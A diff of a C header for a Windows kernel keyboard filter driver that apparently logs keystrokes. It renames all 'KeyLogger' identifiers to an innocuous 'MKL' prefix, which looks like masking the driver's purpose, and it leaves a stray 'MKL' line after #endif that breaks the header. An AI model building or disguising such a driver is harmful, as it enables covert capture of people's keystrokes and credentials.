@@ -1,5 +1,5 @@
-#ifndef KEYLOGGER_H
-#define KEYLOGGER_H
+#ifndef MKL_H
+#define MKL_H
 
 #pragma warning(disable:4201)
 
@@ -126,17 +126,17 @@ DRIVER_INITIALIZE
 DriverEntry;
 
 EVT_WDF_DRIVER_DEVICE_ADD					
-KeyLogger_EvtDeviceAdd;
+MKL_EvtDeviceAdd;
 
 EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL
-KeyLogger_EvtIoInternalDeviceControl;
+MKL_EvtIoInternalDeviceControl;
 
 //EVT_WDF_DRIVER_UNLOAD
 //DriverUnload;
 
 
 VOID
-KeyLogger_ServiceCallback(
+MKL_ServiceCallback(
     IN PDEVICE_OBJECT		DeviceObject,
     IN PKEYBOARD_INPUT_DATA InputDataStart,
     IN PKEYBOARD_INPUT_DATA InputDataEnd,
@@ -154,7 +154,7 @@ CreateWorkItem(
 );
 
 VOID
-KeyLoggerQueueWorkItem(
+MKLQueueWorkItem(
 	WDFWORKITEM workItem
 );
 
@@ -208,4 +208,5 @@ DEFINE_GUID(GUID_DEVINTERFACE_KBFILTER,
 
 #define  KBFILTR_DEVICE_ID L"{A65C87F9-BE02-4ed9-92EC-012D416169FA}\\KeyboardFilter\0"
 
-#endif  // KEYLOGGER_H
+#endif  // MKL_H
+MKL
